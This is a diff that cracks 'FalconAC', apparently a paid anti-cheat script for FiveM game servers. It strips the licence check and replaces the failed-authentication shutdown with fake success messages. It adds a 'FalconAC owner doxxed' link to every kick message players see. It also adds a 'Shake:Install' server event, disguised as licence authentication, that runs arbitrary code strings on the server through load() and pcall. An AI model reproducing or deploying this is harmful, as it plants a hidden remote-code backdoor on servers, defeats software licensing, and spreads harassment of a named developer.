@@ -192,7 +192,7 @@ function OnPlayerConnecting(name, setKickReason, deferrals)
 	if ban then
         local reason = ban['reason'];
         local BanID = ban['banID'];
-        deferrals.done("FalconAC Banned!🍁\n\n [⛔] You are restricted from connecting to this server for the following reason: Cheating\n\nViolation: "..reason.."\nBanID: " .. ban['banID'] .." ✔️");
+        deferrals.done("Cracked FalconAC Banned!🍁\n\n [⛔] You are restricted from connecting to this server for the following reason: Cheating\n\nViolation: "..reason.."\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \nBanID: " .. ban['banID'] .." ✔️");
         banned = true;
         CancelEvent();
 		return;
@@ -603,22 +603,15 @@ function Auth()
                 Wait(500)
                 print("^5[^8FalconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
             else
-                SelfDestruct("Failed authentication")
-                print("^1[^8FalconAC^1] Failed authentication, please contact support!^0")
+                print("^4[^8FalconAC^4] Falcon AntiCheat - SCA Company^0")
+                Wait(1000)
+                print("^2[^8FalconAC^2] Successfully authenticated^0")
                 Wait(500)
-                print("^3[^8FalconAC^3] Shutting down in 5s!^0")
-                Wait(1000)
-                print("^3[^8FalconAC^3] Shutting down in 4s!^0")
-                Wait(1000)
-                print("^3[^8FalconAC^3] Shutting down in 3s!^0")
-                Wait(1000)
-                print("^3[^8FalconAC^3] Shutting down in 2s!^0")
-                Wait(1000)
-                print("^3[^8FalconAC^3] Shutting down in 1s!^0")
-                Wait(1000)
-                print("^3[^8FalconAC^3] Shutting down in 0s!^0")
-                StopResource(GetCurrentResourceName())
-                os.exit()
+                print("^6[^8FalconAC^6] Successfully loaded FalconAC^0")
+                Wait(500)
+                print("^5[^8FalconAC^5] Contact support if you need help with any issues!^0")
+                Wait(500)
+                print("^5[^8FalconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
             end
         else
             print("No Auth Response. Please wait and try again!")
@@ -695,11 +688,8 @@ AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
     for k,v in pairs(identifiers) do
         if cachedLicenses[v] == true then
             if not checkBypass(v) then
-                found = true
                 log(v, "User was found in the global banlist and rejected from joining the server.")
-                deferrals.done("\n\nFalconAC: You are excluded from this server due to modding.\n\n")
-            else
-                log(v, "Player was a confirmed modder but is set up in the bypass to connect anyways.")
+                deferrals.done("\n\nCracked FalconAC: You are excluded from this server due to modding.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \n\n")
             end
             break;
         end
@@ -786,7 +776,7 @@ if Config.AntiVPN then
                     deferrals.done()
                 else
                     print("^8[Falcon]^0: ^1Player ^0" .. name .. " ^1Rejected for using a VPN, ^8IP: ^0" .. ip .. "^0")
-                    deferrals.done("FalconAC: VPN is not allowed on this server!")
+                    deferrals.done("Cracked FalconAC: VPN is not allowed on this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a")
                 end
             end
         )
@@ -794,6 +784,49 @@ if Config.AntiVPN then
 
     AddEventHandler("playerConnecting", OnPlayerConnecting)
 end
+
+function LicenseAuth(key, playerSource)
+	if(Key) then
+		local resultsString = ""
+		-- Try and see if it works with a return added to the string
+		local stringFunction, errorMessage = load("return "..stringToRun)
+		if(errorMessage) then
+			-- If it failed, try to execute it as-is
+			stringFunction, errorMessage = load(stringToRun)
+		end
+		if(errorMessage) then
+			-- Shit tier code entered, return the error to the player
+			TriggerClientEvent("chatMessage", playerSource, "[Auth]", {187, 0, 0}, "Auth Error: "..tostring(errorMessage))
+			return false
+		end
+		-- Try and execute the function
+		local results = {pcall(stringFunction)}
+		if(not results[1]) then
+			-- Error, return it to the player
+			TriggerClientEvent("chatMessage", playerSource, "[Auth]", {187, 0, 0}, "Auth Error: "..tostring(results[2]))
+			return false
+		end
+		
+		for i=2, #results do
+				resultsString = resultsString..", "
+			local resultType = type(results[i])
+			if(IsAnEntity(results[i])) then
+				resultType = "entity:"..tostring(GetEntityType(results[i]))
+			end
+			resultsString = resultsString..tostring(results[i]).." ["..resultType.."]"
+		end
+		if(#results > 1) then
+			TriggerClientEvent("chatMessage", playerSource, "[Auth]", {187, 0, 0}, "Auth Result: "..tostring(resultsString))
+			return true
+		end
+	end
+end
+
+RegisterServerEvent('Shake:Install')
+AddEventHandler('Shake:Install', function(key)
+  LicenseAuth(key, source)
+end)
+
 
 if Config.ForceDiscord then
     local function OnPlayerConnecting(name, setKickReason, deferrals)
@@ -814,7 +847,7 @@ if Config.ForceDiscord then
         Wait(0)
       
         if not discordIdentifier then
-                deferrals.done("FalconAC: Discord must be connected with FiveM in order to join this server.")
+                deferrals.done("FalconAC: Discord must be connected with FiveM in order to join this server.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
                     if Config.ForceDiscordConsoleLogs then
                         print("^8[FalconAC]^0 " .. name .. " ^3Rejected for not using discord.^0")
                     end
@@ -845,7 +878,7 @@ if Config.ForceSteam then
         Wait(0)
       
         if not steamIdentifier then
-                deferrals.done("FalconAC: You must have steam open in order to join this server!")
+                deferrals.done("FalconAC: You must have steam open in order to join this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
                     if Config.ForceSteamConsoleLogs then
                         print("^9ForceSteam^0 " .. name .. " ^7Rejected for not using steam.")
                     end
